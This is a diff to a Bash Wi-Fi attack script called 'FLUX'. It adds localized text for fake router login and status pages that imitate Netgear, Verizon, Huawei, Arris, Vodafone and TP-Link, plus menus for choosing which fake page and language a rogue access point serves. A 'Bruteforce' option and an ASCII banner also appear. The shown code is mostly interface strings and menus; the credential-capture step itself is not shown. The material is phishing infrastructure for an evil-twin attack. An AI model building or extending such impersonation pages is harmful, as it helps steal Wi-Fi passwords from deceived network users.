+DIALOG_WEB_INDEX_NETGEAR_IT9="<font color=\"black\" >STATO :<font color=\"green\" > ERRORE"
+DIALOG_WEB_INDEX_NETGEAR_IT10="<font color=\"black\" >STATO :<font color=\"green\" > ERRORE"
+DIALOG_WEB_INDEX_NETGEAR_IT11="<font color=\"black\" >DISPOSITIVI RETE COLLEGATA"
+DIALOG_WEB_INDEX_NETGEAR_IT12="<font color=\"black\" >DispositivI :<font color=\"green\" > 0"
+DIALOG_WEB_INDEX_NETGEAR_IT13="<font color=\"black\" >RETE OSPITE"
+DIALOG_WEB_INDEX_NETGEAR_IT14="<font color=\"black\" >STATO :<font color=\"green\" > ERRORE "
+DIALOG_WEB_INDEX_NETGEAR_IT15="<font color=\"black\" >Connessione senza fili"
+DIALOG_WEB_INDEX_NETGEAR_IT16="<font color=\"black\" >STATO :<font color=\"green\" > ERRORE "
+DIALOG_WEB_INDEX_NETGEAR_IT17="<font color=\"#7671BF\" >CENTRO SOLUZIONE"
+DIALOG_WEB_INDEX_NETGEAR_IT18="<font color=\"#7671BF\" >GESTIONE SOLUZIONE DEI PROBLEMI"
+DIALOG_WEB_INDEX_NETGEAR_IT19="<font color=\"black\" >INTERNET"
+DIALOG_WEB_INDEX_NETGEAR_IT20="<font color=\"black\" >CONTROLLO DEI GENITORI"
+DIALOG_WEB_INDEX_NETGEAR_IT21="<font color=\"#7671BF\">CONTROLLO DI ACCESSO"
+DIALOG_WEB_INDEX_NETGEAR_ITG22="<font color=\"#7671BF\">DISPOSITIVI"
+DIALOG_WEB_INDEX_NETGEAR_IT23="<font color=\"#7671BF\">E RETE "
+DIALOG_WEB_INDEX_NETGEAR_IT24="<font color=\"#7671BF\" > SERVICI DI SISTEMA--------"
+##################### DIALOG-WEB-FAKES-########################################################
+####################     FRANCE       ########################################################
+####DIALOG-INDEX-VERIZON######
+DIALOG_WEB_INDEX_VERIZON_FR1="<font color=\"black\" >LE MENU"
+DIALOG_WEB_INDEX_VERIZON_FR2="<font color=\"black\" >SANS FIL"
+DIALOG_WEB_INDEX_VERIZON_FR3="<font color=\"black\" >RED"
+DIALOG_WEB_INDEX_VERIZON_FR4="<font color=\"black\" >PARE-FEU"
+DIALOG_WEB_INDEX_VERIZON_FR5="<font color=\"black\" >CONTROL"
+DIALOG_WEB_INDEX_VERIZON_FR6="<font color=\"black\" >AVANCÉE"
+DIALOG_WEB_INDEX_VERIZON_FR7="<font color=\"black\" >SUPERVISION"
+DIALOG_WEB_INDEX_VERIZON_FR8="<font color=\"black\" >ACCÈS MENU"
+DIALOG_WEB_INDEX_VERIZON_FR9="<font color=\"black\" >RÉSEAU D'ÉTAT"
+DIALOG_WEB_INDEX_VERIZON_FR10="<font color=\"black\" >ROUTER"
+DIALOG_WEB_INDEX_VERIZON_FR11="<font color=\"white\" >SÉCURITÉ"
+DIALOG_WEB_INDEX_VERIZON_FR12="<font color=\"black\" >SESSION"
+DIALOG_WEB_INDEX_VERIZON_FR13="<font color=\"white\" >SYSTÈME"
+DIALOG_WEB_INDEX_VERIZON_FR14="<font color=\"white\" >ACCÈS"
+DIALOG_WEB_INDEX_VERIZON_FR15="<font color=\"white\" >DISPOSITIFS"
+DIALOG_WEB_INDEX_VERIZON_FR16="<font color=\"black\" >--ACCÈS À L'INFORMATION-- "
+DIALOG_WEB_INDEX_VERIZON_FR17="<font color=\"black\" >--ACCÈS À L'INFORMATION--"
+####DIALOG-INDEX-NETGEAR######
+DIALOG_WEB_INDEX_NETGEAR_FR1="<font color=\"black\" >DE BASE"
+DIALOG_WEB_INDEX_NETGEAR_FR2="<font color=\"black\" >AVANCÉE"
+DIALOG_WEB_INDEX_NETGEAR_FR3="<font color=\"white\" >HOME avancée"
+DIALOG_WEB_INDEX_NETGEAR_FR4="<font color=\"black\" >Assistant"
+DIALOG_WEB_INDEX_NETGEAR_FR5="<font color=\"black\" >WPS WIZARD   Administration"
+DIALOG_WEB_INDEX_NETGEAR_FR6="<font color=\"black\" >Système"
+DIALOG_WEB_INDEX_NETGEAR_FR7="<font color=\"black\" >Sécurité"
+DIALOG_WEB_INDEX_NETGEAR_FR8="<font color=\"black\" >Administraion"
+DIALOG_WEB_INDEX_NETGEAR_FR9="<font color=\"black\" >état :<font color=\"green\" > error"
+DIALOG_WEB_INDEX_NETGEAR_FR10="<font color=\"black\" >état :<font color=\"green\" > de"
+DIALOG_WEB_INDEX_NETGEAR_FR11="<font color=\"black\" >Périphériques réseau liés"
+DIALOG_WEB_INDEX_NETGEAR_FR12="<font color=\"black\" >dispositives :<font color=\"green\" > 0"
+DIALOG_WEB_INDEX_NETGEAR_FR13="<font color=\"black\" >Réseau invité"
+DIALOG_WEB_INDEX_NETGEAR_FR14="<font color=\"black\" >état :<font color=\"green\" > de "
+DIALOG_WEB_INDEX_NETGEAR_FR15="<font color=\"black\" >Connexion sans fil"
+DIALOG_WEB_INDEX_NETGEAR_FR16="<font color=\"black\" >état :<font color=\"green\" >  "
+DIALOG_WEB_INDEX_NETGEAR_FR17="<font color=\"#7671BF\" >Solution Center"
+DIALOG_WEB_INDEX_NETGEAR_FR18="<font color=\"#7671BF\" >la gestion des problèmes de résolution"
+DIALOG_WEB_INDEX_NETGEAR_FR19="<font color=\"black\" >Internet"
+DIALOG_WEB_INDEX_NETGEAR_FR20="<font color=\"black\" >Contrôle parental"
+DIALOG_WEB_INDEX_NETGEAR_FR21="<font color=\"#7671BF\">CONTRÔLE D'ACCÈS"
+DIALOG_WEB_INDEX_NETGEAR_FR22="<font color=\"#7671BF\">DISPOSITIF"
+DIALOG_WEB_INDEX_NETGEAR_FR23="<font color=\"#7671BF\">ET RÉSEAU "
+DIALOG_WEB_INDEX_NETGEAR_FR24="<font color=\"#7671BF\" > SERVICES DE SYSTÈME--------"
+####DIALOG-INDEX-HUAWEI######
+DIALOG_WEB_INDEX_HUAWEI_FR1="STATUS"
+DIALOG_WEB_INDEX_HUAWEI_FR2="BASICS"
+DIALOG_WEB_INDEX_HUAWEI_FR3="ADVANCED"
+DIALOG_WEB_INDEX_HUAWEI_FR4="WIRELESS"
+DIALOG_WEB_INDEX_HUAWEI_FR5="ÉTAT DU RÉSEAU"
+DIALOG_WEB_INDEX_HUAWEI_FR6="Erreurs de connexion"
+####DIALOG-INDEX-ARRIS######
+DIALOG_WEB_INDEX_ARRIS_FR1="WIRELESS"
+DIALOG_WEB_INDEX_ARRIS_FR2="COMMANDE DE RÉSEAU"
+DIALOG_WEB_INDEX_ARRIS_FR3="DISPOSITIFS"
+DIALOG_WEB_INDEX_ARRIS_FR4="CONNECTION"
+DIALOG_WEB_INDEX_ARRIS_FR5="SYSTÈME"
+DIALOG_WEB_INDEX_ARRIS_FR6="RESSOURCES"
+DIALOG_WEB_INDEX_ARRIS_FR7="SÉCURITÉ"
+DIALOG_WEB_INDEX_ARRIS_FR8="STATUS"
+####DIALOG-INDEX-VODAFONE######
+DIALOG_WEB_INDEX_VODAFONE_FR1="**-ETAT DU SERVICE-**"
+DIALOG_WEB_INDEX_VODAFONE_FR2="+Applications"
+DIALOG_WEB_INDEX_VODAFONE_FR3="+Vodafone Wifi"
+DIALOG_WEB_INDEX_VODAFONE_FR4="+Dhcp IP Dmz"
+DIALOG_WEB_INDEX_VODAFONE_FR5="+Le haut débit mobile"
+DIALOG_WEB_INDEX_VODAFONE_FR6="*-RESEAU DOMESTIQUE-*"
+DIALOG_WEB_INDEX_VODAFONE_FR7="+Serveur de fichiers"
+DIALOG_WEB_INDEX_VODAFONE_FR8="+Sistem"
+DIALOG_WEB_INDEX_VODAFONE_FR9="*******-SMS-*******"
+DIALOG_WEB_INDEX_VODAFONE_FR10="+Creer SMS"
+DIALOG_WEB_INDEX_VODAFONE_FR11="+Inbox"
+DIALOG_WEB_INDEX_VODAFONE_FR12="+Boite de reception"
+DIALOG_WEB_INDEX_VODAFONE_FR13="+Brouillon"
+DIALOG_WEB_INDEX_VODAFONE_FR14="*****-SOUTIEN-*****"
+DIALOG_WEB_INDEX_VODAFONE_FR15="  SURCLASSEMENT"
+DIALOG_WEB_INDEX_VODAFONE_FR16="Statut: Connexion Cette page affiche des informations sur l'etat"
+DIALOG_WEB_INDEX_VODAFONE_FR17="--ACCES--INFORMATION--"
+DIALOG_WEB_INDEX_VODAFONE_FR18=""
+DIALOG_WEB_INDEX_VODAFONE_FR19="STATUT"
+DIALOG_WEB_INDEX_VODAFONE_FR20="RELIER"
+DIALOG_WEB_INDEX_VODAFONE_FR21="WIFI"
+DIALOG_WEB_INDEX_VODAFONE_FR22="DEFICIENCE"
+##################### DIALOG-WEB-FAKES-########################################################
+####################     PORTUGAL       ########################################################
+####DIALOG-INDEX-VERIZON######
+DIALOG_WEB_INDEX_VERIZON_POR1="<font color=\"black\" >O MENU"
+DIALOG_WEB_INDEX_VERIZON_POR2="<font color=\"black\" >WIRELESS"
+DIALOG_WEB_INDEX_VERIZON_POR3="<font color=\"black\" >REDE"
+DIALOG_WEB_INDEX_VERIZON_POR4="<font color=\"black\" >FIREWALL"
+DIALOG_WEB_INDEX_VERIZON_POR5="<font color=\"black\" >CONTROL"
+DIALOG_WEB_INDEX_VERIZON_POR6="<font color=\"black\" >ADVANCED"
+DIALOG_WEB_INDEX_VERIZON_POR7="<font color=\"black\" >SUPERVISÃO"
+DIALOG_WEB_INDEX_VERIZON_POR8="<font color=\"black\" >ACESSO MENU"
+DIALOG_WEB_INDEX_VERIZON_POR9="<font color=\"black\" >REDE DE ESTADO"
+DIALOG_WEB_INDEX_VERIZON_POR10="<font color=\"black\" >ROUTER"
+DIALOG_WEB_INDEX_VERIZON_POR11="<font color=\"white\" >SEGURANÇA"
+DIALOG_WEB_INDEX_VERIZON_POR12="<font color=\"black\" >SESSÃO"
+DIALOG_WEB_INDEX_VERIZON_POR13="<font color=\"white\" >SYSTEM"
+DIALOG_WEB_INDEX_VERIZON_POR14="<font color=\"white\" >ACESSO"
+DIALOG_WEB_INDEX_VERIZON_POR15="<font color=\"white\" >DISPOSITIVOS"
+DIALOG_WEB_INDEX_VERIZON_POR16="<font color=\"black\" >--Informações de acesso-- "
+DIALOG_WEB_INDEX_VERIZON_POR17="<font color=\"black\" >--Informações de acesso--"
+####DIALOG-INDEX-NETGEAR######
+DIALOG_WEB_INDEX_NETGEAR_POR1="<font color=\"black\" >BASICO"
+DIALOG_WEB_INDEX_NETGEAR_POR2="<font color=\"black\" >Avançado"
+DIALOG_WEB_INDEX_NETGEAR_POR3="<font color=\"white\" >Serviço"
+DIALOG_WEB_INDEX_NETGEAR_POR4="<font color=\"black\" >Conexão de rede"
+DIALOG_WEB_INDEX_NETGEAR_POR5="<font color=\"black\" >Os dispositivos emparelhados"
+DIALOG_WEB_INDEX_NETGEAR_POR6="<font color=\"black\" >Parental Contro"
+DIALOG_WEB_INDEX_NETGEAR_POR7="<font color=\"black\" >Voz"
+DIALOG_WEB_INDEX_NETGEAR_POR8="<font color=\"black\" >Rede de convidado"
+DIALOG_WEB_INDEX_NETGEAR_POR9="<font color=\"black\" >ESTADO :<font color=\"green\" > ERROR"
+DIALOG_WEB_INDEX_NETGEAR_POR10="<font color=\"black\" >ESTADO :<font color=\"green\" > OFF"
+DIALOG_WEB_INDEX_NETGEAR_POR11="<font color=\"black\" >DISPOSITIVOS DE REDE COM LIGAÇÃO"
+DIALOG_WEB_INDEX_NETGEAR_POR12="<font color=\"black\" >Dispositivos :<font color=\"green\" > 0"
+DIALOG_WEB_INDEX_NETGEAR_POR13="<font color=\"black\" >REDE DE VISITAS"
+DIALOG_WEB_INDEX_NETGEAR_POR14="<font color=\"black\" >ESTADO :<font color=\"green\" > OFF "
+DIALOG_WEB_INDEX_NETGEAR_POR15="<font color=\"black\" >Conexão sem fio"
+DIALOG_WEB_INDEX_NETGEAR_POR16="<font color=\"black\" >ESTADO :<font color=\"green\" > OFF "
+DIALOG_WEB_INDEX_NETGEAR_POR17="<font color=\"#7671BF\" >Solutions Center"
+DIALOG_WEB_INDEX_NETGEAR_POR18="<font color=\"#7671BF\" >RESOLVER PROBLEMAS DE GESTÃO"
+DIALOG_WEB_INDEX_NETGEAR_POR19="<font color=\"black\" >INTERNET"
+DIALOG_WEB_INDEX_NETGEAR_POR20="<font color=\"black\" >RESTRIÇÃO DE REPRODUÇÃO"
+DIALOG_WEB_INDEX_NETGEAR_POR21="<font color=\"#7671BF\">CONTROLE E ACESSO"
+DIALOG_WEB_INDEX_NETGEAR_POR22="<font color=\"#7671BF\">0"
+DIALOG_WEB_INDEX_NETGEAR_POR23="<font color=\"#7671BF\">DISPOSITIVOS DE REDE"
+DIALOG_WEB_INDEX_NETGEAR_POR24="<font color=\"#7671BF\" >SISTEMA DE SEGURANÇA-------"
+####DIALOG-INDEX-HUAWEI######
+DIALOG_WEB_INDEX_HUAWEI_POR1="estado"
+DIALOG_WEB_INDEX_HUAWEI_POR2="básico"
+DIALOG_WEB_INDEX_HUAWEI_POR3="avançado"
+DIALOG_WEB_INDEX_HUAWEI_POR4="o estado do sinal"
+DIALOG_WEB_INDEX_HUAWEI_POR5="Erro de conexão"
+DIALOG_WEB_INDEX_HUAWEI_POR6="Erro de conexão"
+####DIALOG-INDEX-ARRIS######
+DIALOG_WEB_INDEX_ARRIS_POR1="WIRELESS"
+DIALOG_WEB_INDEX_ARRIS_POR2="CONTROLE DE REDE"
+DIALOG_WEB_INDEX_ARRIS_POR3="DISPOSITIVOS"
+DIALOG_WEB_INDEX_ARRIS_POR4="CONEXÃO"
+DIALOG_WEB_INDEX_ARRIS_POR5="SYSTÈM"
+DIALOG_WEB_INDEX_ARRIS_POR6="RECURSOS"
+DIALOG_WEB_INDEX_ARRIS_POR7="SEGURANÇA"
+DIALOG_WEB_INDEX_ARRIS_POR8="STATUS"
+DIALOG_WEB_INDEX_ARRIS_POR9=
+####DIALOG-INDEX-VODAFONE######
+DIALOG_WEB_INDEX_VODAFONE_POR1="*-SERVIÇO DE STATUS-*"
+DIALOG_WEB_INDEX_VODAFONE_POR2="+Aplicações"
+DIALOG_WEB_INDEX_VODAFONE_POR3="+Vodafone Wifi"
+DIALOG_WEB_INDEX_VODAFONE_POR4="+Dhcp IP Dmz"
+DIALOG_WEB_INDEX_VODAFONE_POR5="+Banda larga móvel"
+DIALOG_WEB_INDEX_VODAFONE_POR6="*-REDE DOMÉSTICA-*"
+DIALOG_WEB_INDEX_VODAFONE_POR7="+Servidor de arquivos"
+DIALOG_WEB_INDEX_VODAFONE_POR8="+Sistem"
+DIALOG_WEB_INDEX_VODAFONE_POR9="*******-SMS-*******"
+DIALOG_WEB_INDEX_VODAFONE_POR10="+Criar SMS"
+DIALOG_WEB_INDEX_VODAFONE_POR11="+Caixa de entrada"
+DIALOG_WEB_INDEX_VODAFONE_POR12="+Enviei"
+DIALOG_WEB_INDEX_VODAFONE_POR13="+Rascunho"
+DIALOG_WEB_INDEX_VODAFONE_POR14="*****-APOIO-*****"
+DIALOG_WEB_INDEX_VODAFONE_POR15=" ATUALIZAÇÃO"
+DIALOG_WEB_INDEX_VODAFONE_POR16="Status: Connection Esta página mostra informações sobre o estado "
+DIALOG_WEB_INDEX_VODAFONE_POR17="--ACESSO - INFORMAÇÕES--"
+DIALOG_WEB_INDEX_VODAFONE_POR18=""
+DIALOG_WEB_INDEX_VODAFONE_POR19="STATUS"
+DIALOG_WEB_INDEX_VODAFONE_POR20="CONNECT"
+DIALOG_WEB_INDEX_VODAFONE_POR21="WIFI"
+DIALOG_WEB_INDEX_VODAFONE_POR22="DEFICIÊNCIAS"
+##########################################################################################################################
+
+
 
 # Design
 function top(){
@@ -696,15 +1266,71 @@ fi
 
 if [ $FLUX_DEBUG != 1 ]; then
 	echo ""
-		   sleep 0.1 && echo -e "$red "
-           sleep 0.1 && echo -e "         ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐    "
-           sleep 0.1 && echo -e "         ║▒_     │▒║     │▒║ ║▒    \▒\/▒/    │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║    "
-           sleep 0.1 && echo -e "         ≡◙◙     ║◙║     ║◙║ ║◙      ◙◙      ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜    "
-           sleep 0.1 && echo -e "         ║▒      │▒║__   │▒└_┘▒    /▒/\▒\    │☢╫   │▒└╧┘▒   ║█ \▒█║    "
-           sleep 0.1 && echo -e "         ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘   └▓/  \▓┘   ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘    "
-           sleep 0.1 && echo -e "        ¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯    ¯¯¯ ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯¯¯¯¯¯  "
+	function flying_saucer() {
+	case $1 in
+		1)
+	              sleep 0.1 && echo -e "$red_color_slim " 
+	              sleep 0.1 && echo -e "                                  ┌▓\  /▓┐                             "
+                      sleep 0.1 && echo -e "         ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█              ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐    "
+                      sleep 0.1 && echo -e "         ║▒_     │▒║     │▒║ ║▒              │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║    "                
+                      sleep 0.1 && echo -e "         ≡◙◙     ║◙║     ║◙║ ║◙              ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜    "
+                      sleep 0.1 && echo -e "         ║▒      │▒║__   │▒└_┘▒              │☢╫   │▒└╧┘▒   ║█ \▒█║    "                       
+                      sleep 0.1 && echo -e "         ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘              ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘    "
+                      sleep 0.1 && echo -e "        ¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯   └▓/  \▓┘  ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯  ¯¯¯    "
+                      sleep 0.1 && echo -e ""${transparent}
+		;;
+		2)
+			echo -e "$red_color_slim "
+		       echo -e "                                                                       "
+                       echo -e "         ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐    "
+                       echo -e "         ║▒_     │▒║     │▒║ ║▒              │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║    "                
+                       echo -e "         ≡◙◙     ║◙║     ║◙║ ║◙              ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜    "
+                       echo -e "         ║▒      │▒║__   │▒└_┘▒              │☢╫   │▒└╧┘▒   ║█ \▒█║    "                       
+                       echo -e "         ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘   └▓/  \▓┘   ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘    "
+                       echo -e "        ¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯             ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯  ¯¯¯     "
+                       echo -e ""${transparent}
+		;;
+		3)
+			echo -e "$red_color_slim "
+		       echo -e "                                                                 "
+                       echo -e "         ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐    "
+                       echo -e "         ║▒_     │▒║     │▒║ ║▒    \▒\/▒/    │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║    "                
+                       echo -e "         ≡◙◙     ║◙║     ║◙║ ║◙              ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜    "
+                       echo -e "         ║▒      │▒║__   │▒└_┘▒    /▒/\▒\    │☢╫   │▒└╧┘▒   ║█ \▒█║    "                       
+                       echo -e "         ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘   └▓/  \▓┘   ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘    "
+                       echo -e "        ¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯             ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯  ¯¯¯    "
+                       echo -e ""${transparent}
+		;;
+		4)
+			echo -e "$red_color_slim "
+		       echo -e "                                                                 "
+                       echo -e "         ⌠▓▒▓▒   ⌠▓╗     ⌠█┐ ┌█   ┌▓\  /▓┐   ⌠▓╖   ⌠◙▒▓▒◙   ⌠█\  ☒┐    "
+                       echo -e "         ║▒_     │▒║     │▒║ ║▒    \▒\/▒/    │☢╫   │▒┌╤┐▒   ║▓▒\ ▓║    "                
+                       echo -e "         ≡◙◙     ║◙║     ║◙║ ║◙      ◙◙      ║¤▒   ║▓║☯║▓   ♜◙\✪\◙♜    "
+                       echo -e "         ║▒      │▒║__   │▒└_┘▒    /▒/\▒\    │☢╫   │▒└╧┘▒   ║█ \▒█║    "                       
+                       echo -e "         ⌡▓      ⌡◘▒▓▒   ⌡◘▒▓▒◘   └▓/  \▓┘   ⌡▓╝   ⌡◙▒▓▒◙   ⌡▓  \▓┘    "
+                       echo -e "        ¯¯¯     ¯¯¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯¯  ¯¯¯¯ ¯¯¯¯  ¯¯¯¯¯¯¯  ¯¯¯  ¯¯¯    "
+                       echo -e ""${transparent}
+                             esac
+	                     sleep 0.4
+}
+function print_animated_flying_saucer() {
 
-	echo""
+	echo -e "\033[s"
+
+	for i in `seq 1 8`; do
+		if [ ${i} -le 4 ]; then
+			saucer_frame=${i}
+		else
+			saucer_frame=$(($i-4))
+		fi
+		echo -e "\033[u"
+		flying_saucer ${saucer_frame}
+	done
+} 
+print_animated_flying_saucer
+
+	echo ""
 
 	sleep 1
 	echo -e $red"                     FLUX "$white""$version" (rev. "$green "$revision"$white") "$yellow"by "$white" deltax"
@@ -930,6 +1556,10 @@ function german {
 	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 	selection_1="Mit aktive Nutzer"
 	selection_2="Wähle dein Angriffsziel. Um neuzuscannen tippe $red r$transparent"
+	####
+	select_language_fake="PAGE LANGUAGE SELECT FAKE AP"
+	See_pages_available="SEE APAGES AVAILABLE"
+	Back_to_menu="BACK TO MENU="
 	setinterface
 }
 
@@ -983,6 +1613,10 @@ function english {
 	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 	selection_1="Active clients"
 	selection_2="Select target. For rescan type$red r$transparent"
+	####
+	select_language_fake="PAGE LANGUAGE SELECT FAKE AP"
+	See_pages_available="SEE APAGES AVAILABLE"
+	Back_to_menu="BACK TO MENU="
 	setinterface
 }
 
@@ -1039,6 +1673,10 @@ function romanian {
     #
     selection_1="Clienti activi"
     selection_2="Selecteaza tinta. Pentru rescanare tastati$red r$transparent"
+    ####
+	select_language_fake="PAGE LANGUAGE SELECT FAKE AP"
+	See_pages_available="SEE APAGES AVAILABLE"
+	Back_to_menu="BACK TO MENU="
     setinterface
 }
 
@@ -1095,6 +1733,10 @@ function turkish {
     #
     selection_1="Aktif kullanicilar"
     selection_2="Tekrar taramak icin Hedef seciniz type$red r$transparent"
+    ####
+	select_language_fake="PAGE LANGUAGE SELECT FAKE AP"
+	See_pages_available="SEE APAGES AVAILABLE"
+	Back_to_menu="BACK TO MENU="
     setinterface
 }
 
@@ -1151,6 +1793,10 @@ function spanish {
     #
     selection_1="Clientes activos"
     selection_2="Seleccione objetivo. Para reescanear teclee$red r$transparent"
+    #
+    select_language_fake="Seleciona idioma de pagina FakeAP" 
+    See_pages_available="Ver paginas de login disponibles"
+    Back_to_menu="Volver a Menu"
 	setinterface
 
 }
@@ -1199,6 +1845,10 @@ function chinese {
 	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 	selection_1="活动的客户端"
 	selection_2="选择一个目标. 重扫 按$red r$transparent"
+	####
+	select_language_fake="PAGE LANGUAGE SELECT FAKE AP"
+	See_pages_available="SEE APAGES AVAILABLE"
+	Back_to_menu="BACK TO MENU="
 	setinterface
 }
 
@@ -1256,6 +1906,10 @@ function italian {
     #
     selection_1="Dispositivi connessi"
     selection_2="Seleziona Obiettivo. Per effettuare una nuova scansione delle reti premi$red r$transparent"
+    ####
+	select_language_fake="PAGE LANGUAGE SELECT FAKE AP"
+	See_pages_available="SEE APAGES AVAILABLE"
+	Back_to_menu="BACK TO MENU="
     setinterface
 }
 
@@ -1309,6 +1963,10 @@ function czech {
 	# >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
 	selection_1="Aktivní klienti"
 	selection_2="Select target. Pro znovuskenování napište$red r$transparent"
+	####
+	select_language_fake="PAGE LANGUAGE SELECT FAKE AP"
+	See_pages_available="SEE APAGES AVAILABLE"
+	Back_to_menu="BACK TO MENU="
 	setinterface
 }
 
@@ -1362,6 +2020,10 @@ function greek {
     # >>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>
     selection_1="Ενεργοί πελάτες"
     selection_2="Επιλέξτε στόχο. Για σκανάρισμα ξανά, πατήστε το$red r$transparent"
+    ####
+	select_language_fake="PAGE LANGUAGE SELECT FAKE AP"
+	See_pages_available="SEE APAGES AVAILABLE"
+	Back_to_menu="BACK TO MENU="
     setinterface
 }
 
@@ -3857,7 +4519,7 @@ function webinterface {
 		echo "$header_webinterface"
 		echo
 
-		echo -e "$blue""      1)"$transparent" Web Interface"
+		echo -e "$blue""      1)"$transparent" $header_ConnectionRESET"
 		echo -e "$blue""      2)"$transparent" Bruteforce"
 		echo -e "$blue""      3)"$transparent" \e[1;31mExit"$transparent""
 
@@ -3865,11 +4527,1099 @@ function webinterface {
 		echo -n "#? "
 		read yn
 		case $yn in
-		1 ) matartodo; ConnectionRESET; selection; break;;
+		1 ) matartodo; web-pages; selection; break;;
 		2 ) matartodo; Bruteforce2; break;;
 		3 ) matartodo; exitmode; break;;
 		esac
 	done
+}
+
+function web-pages {
+
+
+
+
+	while true; do
+		conditional_clear
+                top
+		infoap
+		echo
+		echo "$header_ConnectionRESET "
+		echo
+
+		echo -e "$blue""      1)"$transparent"STANDAR(neutra)"
+		echo -e "$blue""      2)"$transparent" $See_pages_available"
+		echo -e "$blue""      3)"$transparent" $Back_to_menu "$transparent""
+
+		echo
+		echo -n "#? "
+		read yn
+		case $yn in
+		1 ) matartodo; ConnectionRESET; selection; break;;
+		2 ) matartodo; web-pages-menu; break;;
+		3 ) matartodo; webinterface; break;;
+		esac
+	done
+}
+
+function web-pages-menu {
+	while true; do
+		conditional_clear
+		top
+		infoap
+		echo
+		echo "$header_ConnectionRESET "
+		echo
+
+		echo -e "$blue""      1)"$transparent" ARRIS"
+		echo -e "$blue""      2)"$transparent" HUAWEI"
+		echo -e "$blue""      3)"$transparent" TP-LINK"
+		echo -e "$blue""      4)"$transparent" VODAFONE"
+		echo -e "$blue""      5)"$transparent" NETGEAR"
+		echo -e "$blue""      6)"$transparent" VERIZON"
+		echo -e "$blue""      7)"$transparent" $Back_to_menu "$transparent""
+
+		echo
+		echo -n "#? "
+		read yn
+		case $yn in
+		1 ) matartodo; ARRIS1; selection; break;;
+		2 ) matartodo; HUAWEI1; break;;
+		3 ) matartodo; TPLINK1; break;;
+		4 ) matartodo; VODAFONE1; break;;
+		5 ) matartodo; NETGEAR1; break;;
+		6 ) matartodo; VERIZON1; break;;
+		7 ) matartodo; webinterface; break;;
+		esac
+	done
+}
+
+
+
+function ARRIS1 {
+	while true; do
+		conditional_clear
+		top
+		
+		infoap
+		echo
+		echo "$header_ConnectionRESET"
+		echo
+		
+		echo -e "$verde""1)"$rescolor" Interface ARRIS"
+		echo -e "$verde""2)"$rescolor" $Back_to_menu "$rescolor""
+		
+		echo
+		echo -n "#? "
+		read line
+		
+		if [ "$line" = "2" ]; then
+			web-pages
+		elif [ "$line" = "1" ]; then
+			conditional_clear
+			top
+			
+			infoap
+			echo
+			echo "$select_language_fake"
+			echo
+			
+			echo -e "$verde""1)"$rescolor" English     [ENG]"
+			echo -e "$verde""2)"$rescolor" Spanish     [ESP]"
+			echo -e "$verde""3)"$rescolor" Italy       [IT]"
+			echo -e "$verde""4)"$rescolor" French      [FR]"
+			echo -e "$verde""5)"$rescolor" Portuguese  [POR]"
+			echo -e "$verde""6)"$rescolor" $Back_to_menu"$rescolor""
+			
+			echo
+			echo -n "#? "
+			read linea
+			language=${webinterfaceslenguage[$line]}
+			
+			if [ "$linea" = "1" ]; then
+				DIALOG_WEB_ERROR=$DIALOG_WEB_ERROR_ENG
+				DIALOG_WEB_INFO=$DIALOG_WEB_INFO_ENG
+				DIALOG_WEB_INPUT=$DIALOG_WEB_INPUT_ENG
+				DIALOG_WEB_OK=$DIALOG_WEB_OK_ENG
+				DIALOG_WEB_SUBMIT=$DIALOG_WEB_SUBMIT_ENG
+				DIALOG_WEB_BACK=$DIALOG_WEB_BACK_ENG
+				DIALOG_WEB_LENGHT_MIN=$DIALOG_WEB_LENGHT_MIN_ENG
+				DIALOG_WEB_LENGHT_MAX=$DIALOG_WEB_LENGHT_MAX_ENG
+				DIALOG_WEB_INDEX_1=$DIALOG_WEB_INDEX_ARRIS_ENG1
+				DIALOG_WEB_INDEX_2=$DIALOG_WEB_INDEX_ARRIS_ENG2
